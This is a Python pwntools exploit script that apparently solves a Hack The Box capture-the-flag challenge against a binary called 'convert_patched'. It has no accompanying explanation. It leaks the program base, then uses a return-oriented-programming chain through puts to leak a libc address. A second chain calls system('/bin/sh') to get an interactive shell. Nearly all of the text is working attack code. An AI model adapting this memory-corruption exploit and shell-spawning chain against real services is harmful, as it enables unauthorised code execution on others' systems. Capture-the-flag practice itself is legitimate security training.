#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./convert_patched')
libc = ELF('./libc.so.6', checksec=False)

def packet(num, name, buf):
	return str(num).encode().rjust(4, b'0') + name + buf

def GDB():
	gdb.attach(p, gdbscript = '''
	# Stop at htb_func
	b*0x55555555535a
	b*0x5555555553a4
	# Break at memcpy of htb_func
	b*0x55555555550c
	# Break at ret of htb_func
	b*0x5555555556aa

	# Ret2csu
	b*0x00555555555bfe

	b gets
	b system
	c
	''')

p = process(exe.path)
# p = remote('127.0.0.1', 9991)

p.recvuntil(b' you ^^\n')
exe.address = u64(p.recv(6) + b'\0\0') - 0x1ada
log.info(hex(exe.address))

##################################
### Stage 1: Leak libc address ###
##################################
payload = b'0001' + b'htb\x00\x00000' + p32(0x60) + b'0'*0x28
p.sendafter(b'server!\n', payload)
payload = b'0001' + b'htb\x00\x00111' + p32(0x90) + b'1'*0x28
p.send(payload)

pop_rdi = exe.address + 0x0000000000001c0b
pop7 = exe.address + 0x1bfe
payload = b'0001' + b'htb\x00\x002222222'
payload += flat(
	pop_rdi, exe.got['puts'],
	exe.plt['puts'],
	pop7,
	p64(exe.address + 0x4080 - 0x10)    # Don't need this one, forgot to remove =)))
)
p.send(payload)

payload = b'0000' + b'htb\0' + b'\x003333333' + p64(exe.address + 0x1AC1)
p.send(payload)
p.recvline()
puts_addr = u64(p.recvline()[:-1] + b'\0\0')
libc.address = puts_addr - libc.sym['puts']
log.info(hex(puts_addr))
log.info(hex(libc.address))

##########################
### Stage 2: Get shell ###
##########################
payload = b'0000' + b'htb\0' + b'\x003333333'
payload += flat(
	pop_rdi, next(libc.search(b'/bin/sh')),
	libc.sym['system']
)
p.sendafter(b'server!\n', payload)

p.interactive()